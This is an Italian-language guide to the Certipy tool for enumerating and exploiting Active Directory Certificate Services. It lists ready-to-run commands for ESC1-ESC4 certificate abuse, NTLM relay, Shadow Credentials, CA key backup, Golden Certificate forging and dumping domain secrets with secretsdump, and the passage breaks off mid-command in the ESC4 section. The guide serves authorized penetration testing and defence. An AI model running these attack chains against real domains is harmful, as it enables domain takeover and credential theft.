---
title: 'Certipy: Guida Completa all''Enumerazione e Abuso di AD CS'
slug: certipy
description: 'Guida completa a Certipy 5.1 per enumerare AD CS, individuare ESC1-ESC17, richiedere certificati, usare PKINIT, relay, Shadow Credentials e Golden Certificate.'
image: /certipy-ad-cs-exploitation.webp
draft: false
date: 2026-07-03T00:00:00.000Z
lastmod: 2026-07-13T00:00:00.000Z
categories:
  - tools
subcategories:
  - expoit
tags:
  - certificate-services
  - ad-cs
---

# Certipy: Guida Completa ad AD CS, ESC1-ESC17, PKINIT e Certificate Abuse

**In sintesi:** Certipy è il toolkit Python di riferimento per enumerare, verificare e — esclusivamente in ambienti autorizzati — sfruttare configurazioni deboli di **Active Directory Certificate Services (AD CS)**. Riunisce in un solo strumento discovery di CA e certificate template, analisi delle tecniche **ESC1-ESC17**, richiesta e recupero di certificati, autenticazione PKINIT o Schannel, NTLM relay verso AD CS, Shadow Credentials, modifica dei template, gestione della CA e forgiatura di Golden Certificate.

La versione stabile più recente al momento della revisione è **Certipy 5.1.0**, pubblicata il 23 giugno 2026. Questa release aggiunge il riconoscimento di **ESC17** e aggiorna la configurazione predefinita usata da `certipy template` negli scenari ESC4.

> **Uso autorizzato:** i comandi presenti sono destinati a penetration test, audit interni, CTF e laboratori sotto autorizzazione esplicita. Certificati, PFX, ticket Kerberos e chiavi della CA sono credenziali a tutti gli effetti: trattali come materiale sensibile e non usarli su sistemi fuori scope.

Per approfondire il contesto prima dei comandi, consulta anche:

* [Active Directory Pentesting](https://hackita.it/articoli/active-directory/)
* [AD CS: tecniche ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/)
* [EKU e OID in AD CS](https://hackita.it/articoli/adcs-eku-oid-offensive/)
* [Certify da Windows](https://hackita.it/articoli/certify/)
* [Shadow Credentials](https://hackita.it/articoli/shadow-credentials/)
* [NTLM Relay](https://hackita.it/articoli/ntlm-relay/)

***

## Cos'è Certipy e a cosa serve

Certipy è uno strumento open-source sviluppato da **Oliver Lyak** per interagire con la PKI Microsoft integrata in Active Directory. Il suo valore non è soltanto nell'automazione dell'exploit: offre un workflow completo e ripetibile per rispondere a cinque domande fondamentali durante un assessment:

1. **Esiste AD CS nel dominio?**
2. **Quali Enterprise CA e certificate template sono pubblicati?**
3. **Quali utenti o gruppi possono richiedere certificati?**
4. **Esistono configurazioni ESC realmente raggiungibili dall'identità corrente?**
5. **Il certificato ottenuto può essere usato via PKINIT, Schannel o per un altro scopo privilegiato?**

La catena tipica è:

```text
Credenziali di dominio
        ↓
certipy find
        ↓
CA, template, ACL, EKU, OID, endpoint e vulnerabilità ESC
        ↓
certipy req / relay / shadow / template / ca
        ↓
Certificato PFX
        ↓
certipy auth
        ↓
TGT Kerberos, LDAP Schannel o — quando supportato — recupero NT hash
        ↓
Validazione dell'impatto e remediation
```

Un certificato di autenticazione emesso per un account AD può essere equivalente alla password o all'hash di quell'account. Per questo CA, template, chiavi private e servizi di enrollment devono essere trattati come componenti **Tier 0**.

***

## Risposta rapida: qual è il comando Certipy da eseguire per primo?

Per una prima enumerazione utile e relativamente pulita:

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -vulnerable -hide-admins -stdout
```

Per salvare anche un output strutturato da confrontare o importare in altri workflow:

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -vulnerable -hide-admins \
  -json -csv -output 'corp-adcs'
```

`-vulnerable` valuta le vulnerabilità rispetto all'identità e ai gruppi dell'utente specificato. Non significa che ogni voce segnalata conduca automaticamente a Domain Admin: alcune tecniche richiedono condizioni aggiuntive, concatenazioni con ACL, modalità di certificate mapping deboli o servizi specifici.

***

## Cheat Sheet Certipy 5.1

| Obiettivo                               | Comando verificato                                                                                                                                                             |
| --------------------------------------- | ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ |
| Versione                                | `certipy -v`                                                                                                                                                                   |
| Help globale                            | `certipy -h`                                                                                                                                                                   |
| Help di un sottocomando                 | `certipy find -h`                                                                                                                                                              |
| Template abilitati e vulnerabili        | `certipy find -u 'user@corp.local' -p 'Pass' -dc-ip 10.0.0.10 -enabled -vulnerable -stdout`                                                                                    |
| Output JSON e CSV                       | `certipy find -u 'user@corp.local' -p 'Pass' -dc-ip 10.0.0.10 -json -csv -output corp-adcs`                                                                                    |
| Enumerazione OID / issuance policy      | `certipy find -u 'user@corp.local' -p 'Pass' -dc-ip 10.0.0.10 -oids -stdout`                                                                                                   |
| Pass-the-Hash                           | `certipy find -u 'user@corp.local' -hashes ':NTHASH' -dc-ip 10.0.0.10 -vulnerable -stdout`                                                                                     |
| Kerberos da ccache                      | `certipy find -k -no-pass -u 'user@corp.local' -dc-host DC01.corp.local -target DC01.corp.local -vulnerable -stdout`                                                           |
| Richiesta RPC                           | `certipy req -u 'user@corp.local' -p 'Pass' -dc-ip 10.0.0.10 -target CA01.corp.local -ca CORP-CA -template User`                                                               |
| Richiesta Web Enrollment                | `certipy req -u 'user@corp.local' -p 'Pass' -target CA01.corp.local -template User -web`                                                                                       |
| ESC1 con UPN e SID                      | `certipy req -u 'user@corp.local' -p 'Pass' -dc-ip 10.0.0.10 -target CA01.corp.local -ca CORP-CA -template VulnTemplate -upn administrator@corp.local -sid 'S-1-5-21-...-500'` |
| Autenticazione PKINIT                   | `certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10`                                                                                                                         |
| LDAP Schannel                           | `certipy auth -pfx administrator.pfx -dc-ip 10.0.0.10 -ldap-shell`                                                                                                             |
| ESC3 on-behalf-of                       | `certipy req -u 'user@corp.local' -p 'Pass' -dc-ip 10.0.0.10 -target CA01.corp.local -ca CORP-CA -template User -on-behalf-of 'CORP\Administrator' -pfx agent.pfx`             |
| Relay ESC8                              | `certipy relay -target 'http://CA01.corp.local' -template DomainController`                                                                                                    |
| Relay ESC11                             | `certipy relay -target 'rpc://CA01.corp.local' -ca CORP-CA -template DomainController`                                                                                         |
| Shadow Credentials automatiche          | `certipy shadow auto -u 'attacker@corp.local' -p 'Pass' -account targetuser -dc-ip 10.0.0.10`                                                                                  |
| Backup configurazione template          | `certipy template -u 'user@corp.local' -p 'Pass' -dc-ip 10.0.0.10 -template VulnTemplate -save-configuration template-backup.json`                                             |
| Applica configurazione ESC1 predefinita | `certipy template -u 'user@corp.local' -p 'Pass' -dc-ip 10.0.0.10 -template VulnTemplate -write-default-configuration`                                                         |
| Ripristina template                     | `certipy template -u 'user@corp.local' -p 'Pass' -dc-ip 10.0.0.10 -template VulnTemplate -write-configuration template-backup.json`                                            |
| Elenca template pubblicati sulla CA     | `certipy ca -u 'pkiadmin@corp.local' -p 'Pass' -target CA01.corp.local -ca CORP-CA -list-templates`                                                                            |
| Approva richiesta                       | `certipy ca -u 'pkiadmin@corp.local' -p 'Pass' -target CA01.corp.local -ca CORP-CA -issue-request 42`                                                                          |
| Backup chiave CA                        | `certipy ca -u 'administrator@corp.local' -p 'Pass' -target CA01.corp.local -backup`                                                                                           |
| Golden Certificate                      | `certipy forge -ca-pfx CORP-CA.pfx -upn administrator@corp.local -sid 'S-1-5-21-...-500' -out administrator-forged.pfx`                                                        |
| Parse offline                           | `certipy parse adcs-registry.reg -format reg -domain corp.local -ca CORP-CA -vulnerable -stdout`                                                                               |

***

## Installazione e aggiornamento

Certipy 5.x richiede **Python 3.12 o successivo**. Un virtual environment evita conflitti con Impacket e con i pacchetti Python di sistema.

### Installazione con pip

```bash
sudo apt update
sudo apt install -y python3 python3-pip python3-venv

python3 -m venv certipy-venv
source certipy-venv/bin/activate

python -m pip install --upgrade pip
python -m pip install certipy-ad

certipy -v
certipy -h
```

### Aggiornamento

```bash
source certipy-venv/bin/activate
python -m pip install --upgrade certipy-ad
certipy -v
```

### Kali Linux

Il pacchetto dei repository Kali usa spesso il nome del binario `certipy-ad`:

```bash
sudo apt update
sudo apt install -y certipy-ad
certipy-ad -v
```

Regola pratica:

```text
Installazione pip       → certipy
Pacchetto Kali apt      → certipy-ad
```

Nella guida viene usato `certipy`. Su Kali sostituiscilo con `certipy-ad` quando necessario.

### Installazione dal repository

```bash
git clone https://github.com/ly4k/Certipy.git
cd Certipy
python3 -m venv .venv
source .venv/bin/activate
python -m pip install .
certipy -v
```

Per un assessment ripetibile, registra sempre la versione usata nel report:

```bash
certipy -v | tee certipy-version.txt
```

***

## Variabili del laboratorio usate negli esempi

Per rendere i comandi leggibili, gli esempi usano questi valori fittizi:

```bash
DOMAIN='corp.local'
DC_HOST='DC01.corp.local'
DC_IP='10.0.0.10'
CA_HOST='CA01.corp.local'
CA_NAME='CORP-CA'
USER='utente@corp.local'
PASSWORD='Password123!'
```

Non incollare password reali nella shell history. In un assessment professionale preferisci variabili temporanee, prompt interattivi, vault o Kerberos ccache.

***

## Sottocomandi disponibili in Certipy 5.1

```text
account   → crea, legge, aggiorna o elimina account AD
          → utile in catene che richiedono modifica UPN, dNSHostName o SPN

auth      → autentica con un PFX
          → PKINIT, TGT, kirbi, tentativo di recupero hash, LDAP Schannel

ca        → gestisce CA, template pubblicati, richieste e ruoli
          → ESC7 e backup della chiave della CA

cert      → converte e manipola certificati, chiavi e PFX localmente

find      → enumera Enterprise CA, template, ACL, endpoint, OID ed ESC

parse     → analizza offline export BOF o file .reg di configurazioni AD CS

forge     → genera Golden Certificate o certificati firmati da una CA compromessa

relay     → NTLM relay verso Web Enrollment HTTP (ESC8) o RPC (ESC11)

req       → richiede, rinnova o recupera certificati tramite RPC, Web o DCOM

shadow    → gestisce msDS-KeyCredentialLink per Shadow Credentials

template  → salva e modifica la configurazione di un certificate template
```

> Nelle release correnti `ptt` non è un sottocomando Certipy. Per usare un ticket salvato in formato ccache su Linux imposta `KRB5CCNAME`; per workflow Windows usa strumenti Kerberos dedicati come Rubeus.

***

## Autenticazione a Certipy: password, hash, Kerberos e AES

Quasi tutti i sottocomandi che interrogano Active Directory condividono gli stessi metodi di autenticazione.

### Password

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -vulnerable -stdout
```

### NT hash

```bash
certipy find \
  -u 'utente@corp.local' \
  -hashes ':8846f7eaee8fb117ad06bdd830b7586c' \
  -dc-ip '10.0.0.10' \
  -vulnerable -stdout
```

Il formato supportato è:

```text
LMHASH:NTHASH
:NTHASH
```

### Kerberos con ccache

```bash
export KRB5CCNAME="$PWD/utente.ccache"

certipy find \
  -k -no-pass \
  -u 'utente@corp.local' \
  -dc-host 'DC01.corp.local' \
  -target 'DC01.corp.local' \
  -vulnerable -stdout
```

Con Kerberos usa hostname FQDN coerenti con DNS e SPN. L'uso diretto dell'IP come `-target` è una causa frequente di errori.

### Kerberos con chiave AES

```bash
certipy find \
  -u 'utente@corp.local' \
  -aes '0123456789abcdef0123456789abcdef0123456789abcdef0123456789abcdef' \
  -dc-host 'DC01.corp.local' \
  -target 'DC01.corp.local' \
  -vulnerable -stdout
```

`-aes` accetta chiavi AES128 o AES256 in formato esadecimale.

### LDAP, LDAPS e porte

Certipy usa LDAPS come default per le operazioni LDAP supportate:

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -ldap-scheme ldaps -ldap-port 636 \
  -vulnerable -stdout
```

In un laboratorio dove LDAPS non è disponibile:

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -ldap-scheme ldap -ldap-port 389 \
  -vulnerable -stdout
```

Non usare `-no-ldap-signing` o `-no-ldap-channel-binding` come prima soluzione a un errore: prima verifica se il problema è DNS, certificato LDAPS, trust della CA, SPN o policy del dominio. Questi flag modificano le garanzie della sessione LDAP e vanno usati solo quando il contesto di test lo richiede.

***

## `find`: enumerazione completa di AD CS

`certipy find` è il punto di partenza. Interroga Active Directory per ottenere Enterprise CA, template, ACL, EKU, issuance policy, enrollment rights e configurazioni rilevanti. Quando possibile prova anche a recuperare la configurazione della CA e a individuare Web Enrollment.

### Enumerazione minima

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -stdout
```

### Solo template pubblicati, abilitati e vulnerabili

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -vulnerable -hide-admins -stdout
```

`-hide-admins` riduce il rumore nascondendo permessi amministrativi attesi. Non usarlo nel report finale se devi documentare l'intero modello di delega PKI.

### Output su file

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -vulnerable \
  -text -json -csv \
  -output 'corp-adcs'
```

Gli output strutturati sono utili per:

* confrontare due audit nel tempo;
* cercare rapidamente template con flag specifici;
* creare evidenze per il report;
* correlare CA, template, OID e gruppi;
* validare remediation senza rileggere tutto lo stdout.

### Enumerare issuance policy e OID — ESC13

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -oids -stdout
```

Cerca:

```text
Issuance Policies
Linked Group
msDS-OIDToGroupLink
```

Un OID collegato a un gruppo privilegiato può trasformare un certificato in un claim di appartenenza al gruppo durante l'autenticazione Kerberos.

### Solo dati dal Domain Controller

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -dc-only -json -output 'corp-adcs-dc-only'
```

`-dc-only` evita il recupero diretto di configurazioni e security descriptor dalla CA e non verifica Web Enrollment. È utile quando la CA non è raggiungibile dal segmento di test, ma produce un assessment meno completo.

### Cross-domain con SID e distinguished name

```bash
certipy find \
  -u 'utente@child.corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.20' \
  -sid 'S-1-5-21-111111111-222222222-333333333-1105' \
  -dn 'CN=Utente,CN=Users,DC=child,DC=corp,DC=local' \
  -vulnerable -stdout
```

Questi parametri aiutano Certipy a valutare l'identità corretta in scenari cross-domain o trust complessi.

***

## Come leggere l'output di `certipy find`

Non fermarti alla riga `[!] Vulnerabilities`. Valuta sempre le condizioni che rendono il finding realmente sfruttabile.

### Campi della Certificate Authority

```text
CA Name
DNS Name
Certificate Subject
Web Enrollment
User Specified SAN
Request Disposition
Enforce Encryption for Requests
Disabled Extensions
Permissions
```

Elementi ad alto valore:

* **Web Enrollment: Enabled** con NTLM e protezioni IIS deboli → possibile ESC8;
* **Enforce Encryption for Requests: Disabled** → possibile ESC11;
* **User Specified SAN: Enabled** → ESC6;
* SID security extension nella lista **Disabled Extensions** → ESC16;
* ACL con **Manage CA** o **Manage Certificates** assegnati a utenti non privilegiati → ESC7;
* accesso amministrativo al server CA o alla chiave privata → ESC5.

### Campi dei template

```text
Template Name
Enabled
Client Authentication
Enrollment Agent
Any Purpose
Enrollee Supplies Subject
Extended Key Usage
Application Policies
Schema Version
Requires Manager Approval
Authorized Signatures Required
Enrollment Flag
Issuance Policies
Permissions
User Enrollable Principals
Vulnerabilities
Remarks
```

Decision point:

```text
Il template è pubblicato?
        ↓
L'identità corrente può enrollarsi direttamente o tramite un gruppo?
        ↓
Il certificato permette autenticazione, enrollment agent, server auth o altro uso sensibile?
        ↓
Manager approval e firme autorizzate sono assenti o aggirabili?
        ↓
La modalità di certificate mapping del dominio consente l'identità richiesta?
```

### `Remarks` non è decorativo

Nelle versioni moderne Certipy aggiunge note quando una vulnerabilità richiede condizioni esterne. Esempi:

* ESC9 ed ESC16 dipendono dal mapping e/o da una catena ESC6;
* ESC15 dipende dalla patch di CVE-2024-49019;
* ESC17 richiede un servizio da impersonare e una seconda fase specifica;
* ESC10 non viene identificato integralmente da LDAP perché dipende dal registro Schannel dei server.

***

## Mappa ESC1-ESC17

| ESC                                                | Condizione principale                                                         | Ruolo di Certipy                                         | Nota operativa                                                                                                                      |
| -------------------------------------------------- | ----------------------------------------------------------------------------- | -------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------- |
| [ESC1](https://hackita.it/articoli/esc1-adcs/)     | Enrollee Supplies Subject, EKU di autenticazione ed enrollment debole         | `find`, `req`, `auth`                                    | Nei domini moderni considera SID security extension e strong certificate mapping                                                    |
| [ESC2](https://hackita.it/articoli/esc2-adcs/)     | EKU Any Purpose o assenza di EKU                                              | `find`, `req`                                            | L’impatto dipende dagli utilizzi concreti consentiti dal certificato e dai template disponibili                                     |
| [ESC3](https://hackita.it/articoli/esc3-adcs/)     | Certificate Request Agent / Enrollment Agent                                  | `find`, `req -on-behalf-of`                              | Richiede un certificato Enrollment Agent e un template target compatibile con la richiesta on-behalf-of                             |
| [ESC4](https://hackita.it/articoli/esc4-adcs/)     | ACL di scrittura o controllo sul certificate template                         | `find`, `template`, `req`                                | Salva la configurazione originale, modifica solo quanto necessario e ripristina il template dopo il test                            |
| [ESC5](https://hackita.it/articoli/esc5-adcs/)     | Controllo su oggetti PKI, server CA o chiave privata della CA                 | `find`, `ca -backup`, `forge`                            | Spesso richiede privilegi locali sul server CA, ACL PKI pericolose o compromissione della chiave                                    |
| [ESC6](https://hackita.it/articoli/esc6-adcs/)     | La CA accetta SAN arbitrari tramite `EDITF_ATTRIBUTESUBJECTALTNAME2`          | `find`, `req -upn -sid`                                  | Negli ambienti con Full Enforcement deve spesso essere concatenato con ESC9 o ESC16                                                 |
| [ESC7](https://hackita.it/articoli/esc7-adcs/)     | Permessi deboli Manage CA o Manage Certificates                               | `find`, `ca`, `req -retrieve`                            | Può consentire di pubblicare template, modificare impostazioni della CA o approvare richieste pending                               |
| [ESC8](https://hackita.it/articoli/esc8-adcs/)     | NTLM relay verso AD CS Web Enrollment                                         | `find`, `relay -target http://...`                       | Richiede un endpoint IIS relayable, NTLM utilizzabile e un’autenticazione coercibile nel perimetro autorizzato                      |
| [ESC9](https://hackita.it/articoli/esc9-adcs/)     | Certificate template con flag `NoSecurityExtension`                           | `find`, `account`, `req`, `auth`                         | Lo sfruttamento dipende dal certificate mapping applicato dal dominio e spesso richiede manipolazione UPN o una catena con ESC6     |
| [ESC10](https://hackita.it/articoli/esc10-adcs/)   | Weak certificate mapping tramite Schannel                                     | `auth -ldap-shell` e analisi esterna                     | Certipy può usare Schannel, ma non determina da remoto tutte le chiavi di registro e le policy necessarie alla valutazione completa |
| [ESC11](https://hackita.it/articoli/esc11-adcs/)   | RPC enrollment senza packet privacy obbligatoria                              | `find`, `relay -target rpc://...`                        | La protezione `IF_ENFORCEENCRYPTICERTREQUEST` è normalmente attiva, ma può essere stata disabilitata                                |
| [ESC12](https://hackita.it/articoli/esc12-adcs/)   | Compromissione dello stack YubiHSM2 o accesso alla capacità di firma della CA | Post-exploitation, `forge` dopo il recupero della chiave | Scenario specifico dell’implementazione HSM e generalmente successivo alla compromissione del server CA                             |
| [ESC13](https://hackita.it/articoli/esc13-adcs/)   | Issuance Policy OID collegata a un gruppo Active Directory                    | `find -oids`, `req`, `auth`                              | Verifica il valore di `msDS-OIDToGroupLink` e i privilegi effettivi del gruppo associato                                            |
| [ESC14](https://hackita.it/articoli/adesc14-adcs/) | Explicit certificate mapping debole tramite `altSecurityIdentities`           | `find` parziale, analisi ACL e autenticazione            | Richiede la valutazione del mapping esplicito, dei permessi di scrittura sull’attributo e delle regole di mapping applicate         |
| [ESC15](https://hackita.it/articoli/adesc15-adcs/) | Application Policies arbitrarie su template Schema Version 1                  | `find`, `req -application-policies`                      | Associato a CVE-2024-49019; richiede una CA non correttamente aggiornata con le patch di novembre 2024                              |
| [ESC16](https://hackita.it/articoli/esc16-adcs/)   | SID security extension disabilitata a livello di Certificate Authority        | `find`, `account`, `req`, `auth`                         | La configurazione ha effetto globale sui certificati emessi dalla CA, ma il mapping applicato resta determinante                    |
| [ESC17](https://hackita.it/articoli/esc17-adcs/)   | Enrollee Supplies Subject con EKU Server Authentication                       | `find`, `req`                                            | Può consentire l’impersonazione di servizi TLS, inclusi scenari WSUS, se sono soddisfatti trust, DNS e posizionamento di rete       |

Per la trattazione dedicata delle singole tecniche, usa la guida [AD CS ESC1-ESC16](https://hackita.it/articoli/adcs-esc1-esc16/) e gli articoli specifici già presenti su Hackita.

***

## `req`: protocolli, richiesta e recupero dei certificati

`certipy req` non è un singolo exploit: è il client di enrollment usato per inviare una richiesta, recuperare una richiesta esistente, rinnovare un certificato o usare un Enrollment Agent. La sintassi corretta dipende dal protocollo disponibile sulla CA.

### RPC: metodo predefinito

```bash
certipy req \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'User'
```

Con RPC, `-ca` identifica il nome logico della Certificate Authority e `-target` indica il server che la ospita. Non confondere i due valori:

```text
Server CA / target: CA01.corp.local
Nome CA:             CORP-CA
Configurazione:      CA01.corp.local\CORP-CA
```

### Web Enrollment

```bash
certipy req \
  -u 'utente@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -template 'User' \
  -web
```

Se il portale è pubblicato su HTTPS o su una porta non standard:

```bash
certipy req \
  -u 'utente@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -template 'User' \
  -web -http-scheme 'https' -http-port 443
```

`-web` usa gli endpoint IIS di AD CS. La loro presenza non implica automaticamente ESC8: devi verificare autenticazione NTLM, Extended Protection for Authentication, channel binding, HTTPS e possibilità concreta di ottenere un'autenticazione relayable.

### DCOM

```bash
certipy req \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'User' \
  -dcom
```

Se il mapper RPC non è raggiungibile o l'ambiente usa endpoint dinamici:

```bash
certipy req \
  -u 'utente@corp.local' -p 'Password123!' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'User' \
  -dcom -dynamic-endpoint
```

### Recuperare una richiesta per ID

```bash
certipy req \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -retrieve 42
```

Questa funzione è essenziale negli scenari con approvazione manuale, richieste pending o ESC7. Conserva la private key generata quando Certipy propone di salvarla: il certificato emesso non è utilizzabile senza la chiave privata associata.

### Richiesta con nome output e password PFX

```bash
certipy req \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'User' \
  -out 'utente-auth.pfx' \
  -pfx-password 'PfxPassphrase!'
```

Una passphrase protegge il file a riposo ma non rende innocuo il PFX: chi dispone sia del file sia della password può autenticarsi come il soggetto del certificato.

### Rinnovo di un certificato

```bash
certipy req \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'User' \
  -pfx 'utente-auth.pfx' \
  -pfx-password 'PfxPassphrase!' \
  -renew
```

Il rinnovo funziona soltanto se template, certificato e policy della CA lo consentono.

***

## ESC1: template con subject alternativo controllabile

ESC1 è la catena più conosciuta, ma nel 2026 va descritta con una precisazione fondamentale: dopo l'entrata in Full Enforcement delle modifiche introdotte da KB5014754, il solo UPN nel SAN non è sempre sufficiente. Il certificato deve poter essere associato in modo forte all'oggetto AD corretto; Certipy supporta per questo anche `-sid`.

### Prerequisiti tipici

```text
Template pubblicato e abilitato
+ identità corrente con Enroll
+ CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
+ EKU utile all'autenticazione, per esempio Client Authentication
+ nessuna Manager Approval
+ nessuna authorized signature richiesta
+ mapping del certificato compatibile con l'identità richiesta
```

### 1. Enumera e conferma la reachability

```bash
certipy find \
  -u 'helpdesk@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -vulnerable -stdout
```

Non fermarti alla stringa `ESC1`: verifica sempre `User Enrollable Principals`, EKU, approval, firme autorizzate, CA pubblicante e note `Remarks`.

### 2. Recupera il SID dell'account target

In un assessment autorizzato puoi ricavarlo da BloodHound, LDAP, PowerShell amministrativo o strumenti Impacket. Esempio con `lookupsid.py`:

```bash
impacket-lookupsid \
  'corp.local/helpdesk:Password123!@10.0.0.10' \
  | grep -i 'Administrator'
```

Esempio atteso:

```text
500: CORP\Administrator (SidTypeUser)
Domain SID: S-1-5-21-111111111-222222222-333333333
```

SID completo:

```text
S-1-5-21-111111111-222222222-333333333-500
```

### 3. Richiedi il certificato

```bash
certipy req \
  -u 'helpdesk@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'HelpDeskCert' \
  -upn 'administrator@corp.local' \
  -sid 'S-1-5-21-111111111-222222222-333333333-500' \
  -out 'administrator.pfx'
```

### 4. Autentica e valida l'impatto

```bash
certipy auth \
  -pfx 'administrator.pfx' \
  -dc-ip '10.0.0.10'
```

Quando l'identità contenuta nel certificato è ambigua:

```bash
certipy auth \
  -pfx 'administrator.pfx' \
  -dc-ip '10.0.0.10' \
  -username 'administrator' \
  -domain 'corp.local'
```

Output possibili:

```text
TGT Kerberos salvato in administrator.ccache
NT hash recuperato tramite U2U, se supportato e consentito
Errore di mapping se UPN/SID/certificato non combaciano
Errore PKINIT se il KDC non dispone di un certificato adatto
```

### 5. Usa il TGT senza esporre nuovamente la password

```bash
export KRB5CCNAME="$PWD/administrator.ccache"

impacket-secretsdump \
  -k -no-pass \
  'corp.local/administrator@DC01.corp.local'
```

La risoluzione DNS e l'orario devono essere corretti. Con Kerberos preferisci hostname FQDN coerenti con gli SPN, non IP grezzi.

### ESC1 e Full Enforcement

Dal 2026 devi assumere come baseline che i Domain Controller aggiornati usino **Full Enforcement** per il certificate mapping. Le vecchie guide che mostrano soltanto:

```bash
-upn 'administrator@corp.local'
```

possono fallire con errori di mapping. Il SID corretto, la SID security extension e le condizioni specifiche delle tecniche ESC9/ESC16 diventano quindi centrali. Non disabilitare i controlli di mapping per “far funzionare il lab” in un ambiente reale: sarebbe una regressione di sicurezza.

***

## ESC2: Any Purpose e certificati senza EKU

Un template con EKU **Any Purpose** o senza EKU può produrre certificati utilizzabili per più scopi. L'impatto non è uniforme: dipende dalle application policy, dal mapping, dalle autorizzazioni di enrollment e dal servizio che accetta il certificato.

```bash
certipy find \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -enabled -vulnerable -stdout
```

Richiesta base:

```bash
certipy req \
  -u 'utente@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'AnyPurposeTemplate' \
  -out 'any-purpose.pfx'
```

Analizza il certificato prima di attribuire severità:

```bash
openssl pkcs12 \
  -in 'any-purpose.pfx' \
  -clcerts -nokeys \
  -passin pass: \
  | openssl x509 -text -noout
```

Cerca:

```text
Extended Key Usage
Application Policies
Subject Alternative Name
szOID_NTDS_CA_SECURITY_EXT / SID security extension
Issuer e chain
Key Usage
```

Un certificato Any Purpose non significa automaticamente Domain Admin. Dimostra quale servizio lo accetta e quale identità viene mappata.

***

## ESC3: Enrollment Agent e richiesta on-behalf-of

ESC3 coinvolge due elementi distinti:

1. un template che rilascia un certificato **Certificate Request Agent**;
2. un template target che accetta richieste firmate da un Enrollment Agent.

### 1. Richiedi il certificato Enrollment Agent

```bash
certipy req \
  -u 'enroller@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'EnrollmentAgent' \
  -out 'agent.pfx'
```

### 2. Richiedi un certificato per conto dell'account target

```bash
certipy req \
  -u 'enroller@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'User' \
  -on-behalf-of 'CORP\Administrator' \
  -pfx 'agent.pfx' \
  -out 'administrator-on-behalf-of.pfx'
```

Se `agent.pfx` è protetto:

```bash
certipy req \
  -u 'enroller@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
  -ca 'CORP-CA' \
  -template 'User' \
  -on-behalf-of 'CORP\Administrator' \
  -pfx 'agent.pfx' \
  -pfx-password 'PfxPassphrase!' \
  -out 'administrator-on-behalf-of.pfx'
```

### 3. Autentica

```bash
certipy auth \
  -pfx 'administrator-on-behalf-of.pfx' \
  -dc-ip '10.0.0.10'
```

### Errori comuni ESC3

```text
CERTSRV_E_TEMPLATE_DENIED
→ l'utente non può usare il template oppure il template non è pubblicato

CERTSRV_E_ENROLL_DENIED
→ l'Enrollment Agent non è autorizzato per quel target/template

Certificato emesso ma auth fallisce
→ EKU, mapping o identità nel certificato non sono adatti all'autenticazione
```

***

## ESC4: ACL scrivibili sui certificate template

ESC4 non è “un template vulnerabile” in senso statico. È la possibilità di **modificare** un template tramite ACL AD e trasformarlo temporaneamente in una configurazione sfruttabile.

La sintassi moderna non usa più `-save-old` o `-configuration`. In Certipy 5.x usa:

```text
-save-configuration
-write-default-configuration
-write-configuration
```

### 1. Salva la configurazione originale

```bash
certipy template \
  -u 'attacker@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -template 'LegacyVPN' \
  -save-configuration 'LegacyVPN-original.json'
```

### 2. Applica la configurazione ESC1 predefinita di Certipy

```bash
certipy template \
  -u 'attacker@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -template 'LegacyVPN' \
  -write-default-configuration
```

Certipy effettua comunque un backup se modifichi il template senza `-no-save`. Il nome esplicito del file rende però la catena più controllabile e documentabile.

### 3. Richiedi il certificato

```bash
certipy req \
  -u 'attacker@corp.local' -p 'Password123!' \
  -dc-ip '10.0.0.10' \
  -target 'CA01.corp.local' \
